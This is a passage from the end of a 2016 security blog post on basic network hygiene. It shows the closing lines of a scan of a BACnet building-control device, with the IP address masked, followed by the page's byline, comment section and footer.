</span><span class='line'>|   Model Name: LGR1000
</span><span class='line'>|   Description: Device Description
</span><span class='line'>|   Location: Device Location
</span><span class='line'>|   Broadcast Distribution Table (BDT):
</span><span class='line'>|     182.X.X.X:47808
</span><span class='line'>|_  Foreign Device Table (FDT): Empty Table</span></code></pre></td></tr></table></div></figure></p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Vijay Kumar</span></span>

      




<time class='entry-date' datetime='2016-03-03T13:47:44+05:30'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2016</span></span> <span class='time'>1:47 pm</span></time>
      


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://bitvijays.github.io/blog/2016/03/03/learning-from-the-field-basic-network-hygiene/" data-via="" data-counturl="http://bitvijays.github.io/blog/2016/03/03/learning-from-the-field-basic-network-hygiene/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/04/09/learning-from-the-field-intelligence-gathering/" title="Previous Post: Learning from the field: Intelligence Gathering">&laquo; Learning from the field: Intelligence Gathering</a>
      
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    
  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - Vijay Kumar -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'techbitvijays';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://bitvijays.github.io/blog/2016/03/03/learning-from-the-field-basic-network-hygiene/';
        var disqus_url = 'http://bitvijays.github.io/blog/2016/03/03/learning-from-the-field-basic-network-hygiene/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
